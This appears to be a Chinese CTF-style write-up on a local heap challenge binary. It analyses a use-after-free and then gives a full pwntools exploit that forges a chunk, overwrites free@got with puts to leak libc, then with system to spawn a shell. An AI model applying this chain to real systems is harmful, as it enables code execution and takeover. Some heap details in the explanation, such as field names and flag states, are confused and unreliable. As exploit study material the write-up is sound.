# 漏洞利用文档

## 执行环境
基于漏洞利用脚本和调试记录分析，程序的运行环境如下：

- **二进制文件类型**：64位ELF可执行文件，使用`file`命令可能显示为`ELF 64-bit LSB executable, x86-64`。程序无PIE（Position Independent Executable）保护，GOT表地址固定（如0x602018），便于利用。
- **安全机制**：
  - **Canary**：未启用栈保护，exp未涉及栈溢出，但堆利用无需绕过Canary。
  - **NX**：可能启用（非执行堆栈），但exp通过GOT劫持执行system函数，不依赖shellcode。
  - **PIE**：未启用，代码段和全局变量地址固定，便于计算偏移。
  - **RELRO**：Partial RELRO，GOT表可写，允许覆盖GOT条目。
- **依赖库**：通过`ldd`命令可能显示依赖libc.so.6等标准库。exp使用`LibcSearcher`动态解析libc偏移，表明libc版本不确定，但可通过泄露地址计算。
- **运行需求**：程序在Linux环境下运行，需通过终端交互。exp使用pwntools库，依赖Python环境。

## 漏洞成因
### 关键结构体分析
程序未显式定义结构体，但通过全局变量管理秘密：
- `f_ptr` (0x6020d0): 指向小秘密（40字节）的指针。
- `s_ptr` (0x6020e0): 指向大秘密（4000字节）的指针。
- `q_ptr` (0x6020e8): 指向巨大秘密（400000字节）的指针。
- `f_flag`、`s_flag`、`q_flag`: 对应秘密的分配状态标志（1为已分配，0为未分配）。

### 漏洞分析
**漏洞类型**：Use-After-Free (UAF)  
**根本原因**：  
- 在`del()`函数中，释放内存后仅将标志位置0，但未将指针设置为NULL（例如：`free(f_ptr); f_flag = 0;`），导致指针成为悬空指针。  
- 在`update()`函数中，仅检查标志位（如`if(f_flag)`），未验证指针有效性，允许向已释放内存写入数据。  

**漏洞触发场景**：  
1. 用户通过`add()`分配小秘密或大秘密。  
2. 通过`del()`删除该秘密（内存释放，但指针未置空）。  
3. 通过`update()`更新秘密内容（向已释放内存写入），破坏堆元数据或控制数据。  
4. 结合堆管理机制，可实现任意地址读写或代码执行。  

**额外问题**：巨大秘密无法释放，导致内存泄漏；删除功能缺少输入验证，可能造成无效释放。

## 漏洞利用过程
结合exp步进调试信息，整个利用过程分为多个阶段，关键内存变化如下表所示。表格总结了每个步骤的堆状态、全局变量状态和利用进展：

| 步骤 | EXP操作 | 堆状态变化 | 全局变量状态变化 | 利用进展 |
|------|----------|-------------|-------------------|-----------|
| 1 | `add(1,b'a');add(2,b'a');de(1)` | 小秘密堆块(0x21329960)释放到fastbins，用户数据清零 | `f_ptr`指向已释放堆块，`f_flag=1`（UAF条件成立） | 触发UAF，建立利用基础 |
| 2 | `add(3,b'a')` | 小秘密堆块转移到smallbins，用户数据被libc地址覆盖 | `s_ptr`和`q_ptr`清零 | 堆布局优化，libc地址泄露准备 |
| 3 | `de(1)` | 堆块同时出现在fastbins和smallbins（元数据异常） | 无显著变化 | 堆状态不稳定，但UAF维持 |
| 4 | `add(1, fake_chunk)` | 写入伪造堆元数据：`fd_nextsize=0x6020b8`, `bk_nextsize=0x6020c0` | `f_ptr`被修改为指向自身附近地址 | 建立任意地址写通道，指向全局变量区域 |
| 5 | `de(2)` | 大秘密堆块释放，可能合并到top chunk | `f_flag`低位变0（小秘密释放状态） | 清理内存，为后续操作准备 |
| 6 | `update(1, f)` | 用户数据写入GOT地址：`atoi_GOT`, `puts_GOT`, `free_GOT` | `f_ptr`被劫持为`free@got.plt` (0x602018) | 收集GOT地址，控制流劫持准备 |
| 7 | `update(1, p64(puts_plt))` | 无直接堆变化 | `free@got.plt`被覆盖为`puts@plt` (0x400760) | 第一次GOT劫持，用于泄露libc |
| 8 | `de(2); p.recv(6)` | 触发`free`（实际执行`puts`），泄露libc地址 | 无变化 | 成功泄露libc基址 |
| 9 | `update(1, p64(system))` | 无直接堆变化 | `free@got.plt`被覆盖为`system`地址 | 最终GOT劫持，准备代码执行 |
| 10 | `add(2, b'sh\0')` | 堆中写入"sh"字符串 (0x6873) | `f_flag`低位变1（小秘密重新分配） | 准备`system`参数 |
| 11 | `de(2)` | 触发`free`（实际执行`system`），启动`/bin/dash` shell | 原始程序结束，shell进程接管 | 代码执行成功，获得shell |
| 12 | `p.interactive()` | 无变化 | 无变化 | 进入交互式shell会话 |

### 内存变化关键点：
- **堆元数据破坏**：通过UAF写入伪造chunk，使`fd_nextsize`和`bk_nextsize`指向全局变量区域，实现任意地址写。
- **GOT劫持**：先后覆盖`free@got.plt`为`puts@plt`（泄露libc）和`system`（代码执行）。
- **进程切换**：原始程序结束，新进程`/bin/dash`启动，exp获得完整控制权。

## Exploit
以下为漏洞利用脚本（exp），在关键位置添加注释解释利用逻辑：

```python
from pwn import *
from LibcSearcher import *

# 设置调试环境和二进制文件
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample6')
p = process('./data/sample6')
libc = elf.libc  # 获取libc引用

# 定义关键地址：全局变量和GOT表条目
f_ptr = 0x6020d0  # 小秘密指针的全局变量地址
atoi_GOT = elf.got['atoi']  # atoi函数的GOT地址
free_GOT = elf.got['free']  # free函数的GOT地址
puts_GOT = elf.got['puts']  # puts函数的GOT地址
puts_plt = elf.plt['puts']  # puts函数的PLT地址

# Libc函数偏移（通过LibcSearcher动态获取或静态定义）
atoi_offset = 0x36e70  # atoi函数在libc中的偏移
system_offset = 0x45380  # system函数在libc中的偏移

def add(t, s):
    """添加秘密：t=1(小),2(大),3(巨大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'1')  # 选择添加功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 发送秘密内容

def de(t):
    """删除秘密：t=1(小),2(大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'2')  # 选择删除功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型

def update(t, s):
    """更新秘密内容：t=1(小),2(大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'3')  # 选择更新功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 发送新内容

# 利用开始
# Step 1: 分配和释放小秘密，触发UAF
add(1, b'a'); add(2, b'a'); de(1)  # 分配两个秘密后释放小秘密，建立UAF条件

# Step 2: 分配巨大秘密，改变堆布局
add(3, b'a')  # 分配巨大秘密，使小秘密堆块进入smallbins，用户数据被libc地址覆盖

# Step 3: 再次释放小秘密，强化UAF状态
de(1)  # 释放小秘密，堆元数据可能异常，但UAF维持

# Step 4: 写入伪造堆块，构造任意地址写
fake_chunk = p64(0) + p64(0x21) + p64(f_ptr - 0x18) + p64(f_ptr - 0x10) + b'\x20'
add(1, fake_chunk)  # 通过UAF写入伪造元数据，使fd_nextsize/bk_nextsize指向全局变量区域

# Step 5: 释放大秘密，清理内存
de(2)  # 释放大秘密，为后续操作准备

# Step 6: 劫持全局变量，写入GOT地址
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1) * 3
update(1, f)  # 向f_ptr指向的地址（已劫持）写入GOT地址，收集关键函数位置

# Step 7: 第一次GOT覆盖，将free@got.plt改为puts@plt
update(1, p64(puts_plt))  # 覆盖free@got.plt，触发free时实际执行puts，用于泄露libc

# Step 8: 触发free（实际执行puts），泄露libc地址
de(2)  # 释放大秘密，实际调用puts，输出libc地址
s = p.recv(6)  # 接收泄露的地址（6字节）
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset  # 计算libc基址
system = libc_base + system_offset  # 计算system函数地址

# Step 9: 第二次GOT覆盖，将free@got.plt改为system
update(1, p64(system))  # 覆盖free@got.plt为system，准备代码执行

# Step 10: 分配大秘密并写入"sh"字符串
add(2, b'sh\0')  # 写入"sh"作为system的参数

# Step 11: 触发free（实际执行system），获得shell
de(2)  # 释放大秘密，实际调用system("sh")，启动shell

# Step 12: 进入交互模式
p.interactive()  # 用户可输入命令，控制shell
```

### 注释说明：
- **关键函数**：`add`、`de`、`update` 封装了程序功能，用于操作堆内存。
- **利用链**：通过UAF写入伪造堆元数据 → 劫持全局变量 → 覆盖GOT → 泄露libc → 执行system。
- **地址计算**：使用固定GOT地址（无PIE）和libc偏移，实现可靠利用。
- **触发时机**：通过`de(2)`触发`free`调用，但实际执行被劫持的函数（puts或system）。

此exp成功利用了UAF漏洞，通过堆元数据伪造和GOT劫持，最终获得shell控制权。
